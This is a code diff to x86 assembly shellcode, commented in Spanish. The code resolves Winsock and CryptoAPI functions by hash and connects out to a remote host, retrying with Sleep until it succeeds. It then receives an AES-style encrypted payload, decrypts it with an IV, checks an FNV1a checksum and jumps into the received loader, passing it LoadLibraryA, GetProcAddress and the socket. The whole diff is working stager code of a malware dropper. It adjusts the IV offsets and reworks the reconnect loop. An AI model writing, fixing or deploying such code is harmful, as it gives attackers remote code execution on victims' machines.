@@ -90,7 +90,6 @@ ws2_32_symbol_hashes:
         API_DEFINE(connect, ('c') ('o') ('n') ('n') ('e') ('c') ('t'))
         API_DEFINE(WSAStartup, ('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p'))
         API_DEFINE(closesocket, ('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t'))
-        //API_DEFINE(send, ('s') ('e') ('n') ('d'))
         API_DEFINE(inet_addr, ('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r'))
         API_DEFINE(gethostbyname, ('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e'))
         API_DEFINE(recv, ('r') ('e') ('c') ('v'))
@@ -388,6 +387,14 @@ newSocket:
         call [ebp+_WSASocketA]          //>WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
         mov  [ebp+_hSocket], eax        //hSocket = EAX
 
+sleep_and_loop:
+#ifdef SC_NULL
+        push 0x7F                       //v
+        shl  DWORD PTR[esp], 0x3        //v
+#else //SC_NULL
+        push 0x3F8                      //v
+#endif //SC_NULL
+        call [ebp+_Sleep]               //Sleep(0x3F8);
 connect_loop:
         //Obtenemos la dirección válida
         push [ebp+_pHOST]               //v
@@ -412,19 +419,8 @@ connect_loop:
         call [ebp+_connect]             //>connect(hSocket, &sockaddr_in, size(sockaddr_in));
         add  esp, 0x8                   //Reparamos la pila eliminando sockaddr_in
         test eax, eax                   //v
-        jge  connected                  //>(EAX>=0)? (Conectamos con éxito, sigamos!)
-
-sleep_and_loop:
-#ifdef SC_NULL
-        push 0x7F                       //v
-        shl  DWORD PTR[esp], 0x3        //v
-#else //SC_NULL
-        push 0x3F8                      //v
-#endif //SC_NULL
-        call [ebp+_Sleep]               //Sleep(0x3F8);
-        jmp  connect_loop
+        jl   sleep_and_loop             //>(EAX<0)? (Error, reseteemos)
 connected:
-
         /*###############################################################################
         ** Recepción de datos desde el cliente:
         **  Una vez establecida la conexión con éxito intentamos recibir 
@@ -496,7 +492,7 @@ init_decrypt:
         call [ebp+_CryptSetKeyParam]    //>CryptSetKeyParam(hKey, KP_IV, (BYTE*)IV, 0);
 
         //Restamos el IV a los datos
-        add  DWORD PTR[ebp+_pBuff], 16          //pBuff+= 16
+        //add  DWORD PTR[ebp+_pBuff], 16          //pBuff+= 16
         sub  DWORD PTR[ebp+_buffLen], 16        //buffLen-= 16
         push [ebp+_buffLen]                     //Guardamos SizeOfPayLoad+4
 
@@ -505,10 +501,12 @@ init_decrypt:
 
         cdq                             //EDX = 0
 
+        mov  esi, [ebp+_pBuff]          //ESI = pBuff = &IV
+        add  esi, 16                    //ESI = &Checksum
         push [ebp+_buffLen]             //Variable temporal para guardar el tamaño de los datos a leer
 
         push esp                        //v
-        push [ebp+_pBuff]               //v
+        push esi                        //v
         push edx                        //v
         push 1                          //v
         push edx                        //v
@@ -528,7 +526,6 @@ init_decrypt:
         **    (Elegido por una buena relación tamaño-calidad)
         *###############################################################################*/
 
-        mov  esi, [ebp+_pBuff]          //ESI = pBuff = &Checksum
         sub  ecx, 4                     //ECX = SizePayload
         mov  ebx, [esi]                 //EBX = CheckSum
         add  esi, 4                     //ESI+= 4 (saltamos checksum)
@@ -552,7 +549,7 @@ FNV1a:
         push [ebp+_LoadLibraryA]        //v
 #endif //SC_NULL
         mov  eax, [ebp+_pBuff]          //v
-        add  eax, 0x4                   // Saltamos hasta el cargador_IAT
+        add  eax, 0x14                  // Saltamos hasta el cargador_IAT
         call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);
         //En caso de que haya habido algún error no crítico el loader me devuelve la ejecución
         jmp KillSocket                  //Reiniciamos el bucle de espera
